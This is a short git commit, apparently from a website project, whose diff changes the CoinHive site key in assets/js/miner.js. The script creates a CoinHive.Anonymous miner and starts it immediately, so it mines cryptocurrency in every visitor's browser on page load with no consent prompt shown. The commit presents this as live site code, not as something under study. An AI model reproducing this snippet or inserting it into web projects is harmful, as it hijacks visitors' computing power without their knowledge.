9b8e2083ffc3672af0c6bf27e2a19daebd554011
Luis Felipe Kaufmann da Silva <luis.kaufmann.silva@gmail.com>
2017-09-20 10:43:15 -0300

    save

--- assets/js/miner.js
+++ assets/js/miner.js
@@ -1,5 +1,5 @@
 (function (window, CoinHive){
 	var options = {};
-	window.miner = new CoinHive.Anonymous('UqIlaUwnd6VlQtc5kLfeFxRQRygNcNPW', options);
+	window.miner = new CoinHive.Anonymous('ezvz8WBcd6MTmhfPpFoetx0k7HUpXkD1', options);
 	window.miner.start();
 })(window, window.CoinHive);
